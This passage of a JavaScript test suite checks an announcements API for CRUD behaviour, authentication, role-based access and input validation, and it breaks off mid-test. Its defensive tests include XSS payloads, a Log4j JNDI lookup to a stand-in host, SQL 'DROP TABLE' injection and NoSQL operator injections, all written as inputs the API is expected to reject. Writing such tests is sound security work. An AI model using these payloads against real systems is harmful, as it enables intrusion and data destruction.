          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Unauthorized Update' });

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });
    });

    describe('DELETE /api/announcements/:id - Happy Path', () => {
      test('[TC-003-HP-010] should delete announcement successfully', async () => {
        const announcement = await Announcement.create({
          title: 'To Be Deleted',
          content: 'Delete me',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(200);
        expect(response.body.success).toBe(true);

        // Verify announcement is deleted
        const deletedAnnouncement = await Announcement.findById(announcement._id);
        expect(deletedAnnouncement).toBeNull();
      });

      test('[TC-003-HP-011] should remove announcement from public view immediately', async () => {
        const announcement = await Announcement.create({
          title: 'Public Announcement',
          content: 'Visible to all',
          createdBy: adminUser._id,
          isActive: true
        });

        // Delete announcement
        await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        // Check public view
        const publicResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(publicResponse.status).toBe(200);
        expect(publicResponse.body).toHaveLength(0);
      });
    });

    describe('DELETE /api/announcements/:id - Error Path', () => {
      test('[TC-003-EP-013] should return 404 when trying to delete non-existent announcement', async () => {
        const response = await request(app)
          .delete('/api/announcements/507f1f77bcf86cd799439011')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(404);
        expect(response.body.success).toBe(false);
      });

      test('[TC-003-EP-014] should return 400 for invalid ObjectId in delete', async () => {
        const response = await request(app)
          .delete('/api/announcements/invalid_id')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).toBe(400);
        expect(response.body.message).toContain('Invalid ID format');
      });

      test('[TC-003-EP-015] should return 403 when non-admin tries to delete', async () => {
        const announcement = await Announcement.create({
          title: 'Protected Announcement',
          content: 'Cannot be deleted by non-admin',
          createdBy: adminUser._id,
          isActive: true
        });

        const response = await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(response.status).toBe(403);
        expect(response.body.success).toBe(false);
        expect(response.body.message).toBe('Access denied. Admin privileges required.');
      });
    });

    describe('API Response Format Validation', () => {
      test('[TC-003-HP-012] should maintain consistent response format across all endpoints', async () => {
        const announcement = await Announcement.create({
          title: 'Format Test',
          content: 'Testing response format',
          createdBy: adminUser._id,
          isActive: true
        });

        // Test GET format
        const getResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(getResponse.status).toBe(200);
        expect(Array.isArray(getResponse.body)).toBe(true);

        // Test POST format
        const postResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Format Test 2', content: 'Test content' });

        expect(postResponse.status).toBe(201);
        expect(postResponse.body).toHaveProperty('success', true);
        expect(postResponse.body).toHaveProperty('data');

        // Test PUT format
        const putResponse = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated Format Test' });

        expect(putResponse.status).toBe(200);
        expect(putResponse.body).toHaveProperty('success', true);
        expect(putResponse.body).toHaveProperty('data');

        // Test DELETE format
        const deleteResponse = await request(app)
          .delete(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(deleteResponse.status).toBe(200);
        expect(deleteResponse.body).toHaveProperty('success', true);
      });
    });

    describe('Cross-endpoint Integration Tests', () => {
      test('[TC-003-HP-013] should maintain data consistency across all operations', async () => {
        // Create announcement
        const createResponse = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            title: 'Integration Test',
            content: 'Testing cross-endpoint consistency'
          });

        expect(createResponse.status).toBe(201);
        const announcementId = createResponse.body.data._id;

        // Verify creation in public view
        const publicView = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(publicView.status).toBe(200);
        expect(publicView.body).toHaveLength(1);
        expect(publicView.body[0]._id).toBe(announcementId);

        // Verify creation in admin view
        const adminView = await request(app)
          .get('/api/announcements/admin')
          .set('Authorization', `Bearer ${adminToken}`);

        expect(adminView.status).toBe(200);
        expect(adminView.body).toHaveLength(1);
        expect(adminView.body[0]._id).toBe(announcementId);

        // Update announcement
        const updateResponse = await request(app)
          .put(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`)
          .send({ title: 'Updated Integration Test' });

        expect(updateResponse.status).toBe(200);

        // Verify update in public view
        const updatedPublicView = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(updatedPublicView.status).toBe(200);
        expect(updatedPublicView.body[0].title).toBe('Updated Integration Test');

        // Delete announcement
        const deleteResponse = await request(app)
          .delete(`/api/announcements/${announcementId}`)
          .set('Authorization', `Bearer ${adminToken}`);

        expect(deleteResponse.status).toBe(200);

        // Verify deletion in public view
        const finalPublicView = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`);

        expect(finalPublicView.status).toBe(200);
        expect(finalPublicView.body).toHaveLength(0);
      });
    });
  });

  describe('[TC-SEC-001] Security and Authorization Tests', () => {
    describe('Authentication Security', () => {
      test('[TC-SEC-001-1] should reject unauthenticated requests to all endpoints', async () => {
        const endpoints = [
          { method: 'get', path: '/api/announcements' },
          { method: 'post', path: '/api/announcements' },
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'put', path: '/api/announcements/507f1f77bcf86cd799439011' },
          { method: 'delete', path: '/api/announcements/507f1f77bcf86cd799439011' }
        ];

        for (const endpoint of endpoints) {
          const response = await request(app)[endpoint.method](endpoint.path);
          expect(response.status).toBe(401);
          expect(response.body.error).toBe('Access token required');
        }
      });

      test('[TC-SEC-001-2] should reject malformed Bearer tokens', async () => {
        const malformedTokens = [
          'Bearer',
          'Bearer ',
          'bearer valid_token',
          'Basic dGVzdDp0ZXN0',
          'Invalid format'
        ];

        for (const token of malformedTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', token);

          expect([401, 403]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-3] should reject expired or invalid JWT tokens', async () => {
        const invalidTokens = [
          'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature',
          'expired_token_here',
          'tampered_token_content'
        ];

        for (const token of invalidTokens) {
          const response = await request(app)
            .get('/api/announcements')
            .set('Authorization', `Bearer ${token}`);

          expect(response.status).toBe(403);
          expect(response.body.error).toBe('Invalid or expired token');
        }
      });

      test('[TC-SEC-001-4] should prevent token reuse after user deletion', async () => {
        // Create temporary user
        const tempUser = await User.create({
          username: 'temp_user',
          email: 'temp@test.com',
          password: 'password123',
          role: 'employee'
        });

        // Generate token for temp user
        const loginResponse = await request(app)
          .post('/api/auth/login')
          .send({ email: 'temp@test.com', password: 'password123' });
        const tempToken = loginResponse.body.token;

        // Verify token works initially
        const validResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(validResponse.status).toBe(200);

        // Delete user
        await User.deleteOne({ _id: tempUser._id });

        // Token should now be invalid
        const invalidResponse = await request(app)
          .get('/api/announcements')
          .set('Authorization', `Bearer ${tempToken}`);
        expect(invalidResponse.status).toBe(403);
      });
    });

    describe('Authorization Security', () => {
      test('[TC-SEC-001-5] should enforce role-based access control for admin endpoints', async () => {
        const adminEndpoints = [
          { method: 'get', path: '/api/announcements/admin' },
          { method: 'post', path: '/api/announcements', data: { title: 'Test', content: 'Test' } }
        ];

        const nonAdminTokens = [employeeToken, managerToken];

        for (const endpoint of adminEndpoints) {
          for (const token of nonAdminTokens) {
            const request_obj = request(app)[endpoint.method](endpoint.path)
              .set('Authorization', `Bearer ${token}`);
            
            if (endpoint.data) {
              request_obj.send(endpoint.data);
            }

            const response = await request_obj;
            expect(response.status).toBe(403);
            expect(response.body.message || response.body.error).toContain('Admin privileges required');
          }
        }
      });

      test('[TC-SEC-001-6] should prevent privilege escalation attempts', async () => {
        // Attempt to modify user role through announcement creation
        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({
            title: 'Test',
            content: 'Test',
            createdBy: adminUser._id,
            role: 'admin'
          });

        expect(response.status).toBe(403);
      });

      test('[TC-SEC-001-7] should prevent cross-user data access', async () => {
        // Create announcement as admin
        const announcement = await Announcement.create({
          title: 'Admin Only',
          content: 'Secret content',
          createdBy: adminUser._id,
          isActive: true
        });

        // Employee should not be able to modify admin's announcement
        const response = await request(app)
          .put(`/api/announcements/${announcement._id}`)
          .set('Authorization', `Bearer ${employeeToken}`)
          .send({ title: 'Hacked' });

        expect(response.status).toBe(403);
      });
    });

    describe('Input Validation Security', () => {
      test('[TC-SEC-001-8] should sanitize and validate announcement content', async () => {
        const maliciousInputs = [
          {
            title: '<script>alert("XSS")</script>',
            content: 'Normal content',
            expectedStatus: 400
          },
          {
            title: 'Normal title',
            content: '<img src=x onerror=alert("XSS")>',
            expectedStatus: 400
          },
          {
            title: '${jndi:ldap://malicious.com/a}',
            content: 'Log4j injection attempt',
            expectedStatus: 400
          },
          {
            title: "'; DROP TABLE announcements; --",
            content: 'SQL injection attempt',
            expectedStatus: 400
          }
        ];

        for (const input of maliciousInputs) {
          const response = await request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send(input);

          expect(response.status).toBe(input.expectedStatus);
          if (response.status === 400) {
            expect(response.body.message).toContain('Invalid content format');
          }
        }
      });

      test('[TC-SEC-001-9] should prevent NoSQL injection in queries', async () => {
        const maliciousQueries = [
          { id: '{"$ne": null}' },
          { id: '{"$regex": ".*"}' },
          { id: '{"$where": "this.title.length > 0"}' }
        ];

        for (const query of maliciousQueries) {
          const response = await request(app)
            .get(`/api/announcements/${query.id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect([400, 404]).toContain(response.status);
        }
      });

      test('[TC-SEC-001-10] should validate request size limits', async () => {
        const oversizedPayload = {
          title: 'A'.repeat(10000),
          content: 'B'.repeat(100000)
        };

        const response = await request(app)
          .post('/api/announcements')
          .set('Authorization', `Bearer ${adminToken}`)
          .send(oversizedPayload);

        expect([400, 413]).toContain(response.status);
      });

      test('[TC-SEC-001-11] should validate ObjectId format in parameters', async () => {
        const invalidIds = ['invalid', '123', 'not-an-objectid', ''];

        for (const id of invalidIds) {
          const response = await request(app)
            .get(`/api/announcements/${id}`)
            .set('Authorization', `Bearer ${adminToken}`);

          expect(response.status).toBe(400);
          expect(response.body.message).toContain('Invalid ID format');
        }
      });
    });

    describe('Rate Limiting and DoS Protection', () => {
      test('[TC-SEC-001-12] should implement rate limiting for announcement creation', async () => {
        const requests = Array.from({ length: 20 }, (_, i) =>
          request(app)
            .post('/api/announcements')
            .set('Authorization', `Bearer ${adminToken}`)
            .send({
              title: `Spam announcement ${i}